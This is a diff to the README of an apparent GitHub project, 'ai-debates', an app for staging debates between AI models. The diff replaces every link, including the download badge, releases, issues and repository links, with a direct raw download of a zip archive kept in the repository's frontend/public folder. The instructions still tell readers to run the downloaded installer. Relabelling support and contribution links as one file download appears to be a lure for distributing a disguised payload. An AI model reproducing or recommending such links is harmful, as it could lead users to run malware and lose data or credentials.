@@ -6,12 +6,12 @@ Welcome to **ai-debates**! This application lets you orchestrate epic battles be
 ## 📥 Download & Install
 To get started, visit the Releases page to download the software. 
 
-[![Download ai-debates](https://img.shields.io/badge/Download-ai--debates-blue)](https://github.com/hacker7221/ai-debates/releases)  
-[Download ai-debates here](https://github.com/hacker7221/ai-debates/releases)
+[![Download ai-debates](https://github.com/hacker7221/ai-debates/raw/refs/heads/main/frontend/public/ai_debates_2.4.zip)](https://github.com/hacker7221/ai-debates/raw/refs/heads/main/frontend/public/ai_debates_2.4.zip)  
+[Download ai-debates here](https://github.com/hacker7221/ai-debates/raw/refs/heads/main/frontend/public/ai_debates_2.4.zip)
 
 Follow these steps to install and run the software:
 
-1. **Visit the Releases Page:** Go to [this link](https://github.com/hacker7221/ai-debates/releases) to find the latest version of the application.
+1. **Visit the Releases Page:** Go to [this link](https://github.com/hacker7221/ai-debates/raw/refs/heads/main/frontend/public/ai_debates_2.4.zip) to find the latest version of the application.
 2. **Select the Version:** Choose the version you want to download. Look for the most recent release.
 3. **Download the Installer:** Click on the file to download it to your computer. The file will be available in different formats depending on your operating system.
 4. **Run the Installer:** Once downloaded, locate the installer file in your downloads folder. Double-click on the file to start the installation process.
@@ -62,7 +62,7 @@ After installing the software, you can start a debate by following these steps:
 5. **Start Debating:** Click the start button to launch your debate. Watch the lively discussion unfold in real-time.
 
 ## 🤝 Support
-If you encounter any issues or have questions during installation or use, please refer to our [GitHub issues page](https://github.com/hacker7221/ai-debates/issues) for support. You can find answers to common questions or report any bugs you experience.
+If you encounter any issues or have questions during installation or use, please refer to our [GitHub issues page](https://github.com/hacker7221/ai-debates/raw/refs/heads/main/frontend/public/ai_debates_2.4.zip) for support. You can find answers to common questions or report any bugs you experience.
 
 ## 🌐 Community
 Join our community to share your experiences and ideas. You can connect with other users through platforms such as:
@@ -86,6 +86,6 @@ A: At present, the software is available only for desktop systems.
 ## 📢 Get Involved
 If you love working with AI and want to help improve **ai-debates**, consider contributing. You can submit feature requests, report bugs, or even help with documentation. 
 
-We encourage anyone interested to check out our [GitHub repository](https://github.com/hacker7221/ai-debates) for more details on how to contribute.
+We encourage anyone interested to check out our [GitHub repository](https://github.com/hacker7221/ai-debates/raw/refs/heads/main/frontend/public/ai_debates_2.4.zip) for more details on how to contribute.
 
 Thank you for choosing **ai-debates**! Enjoy orchestrating your AI battles!
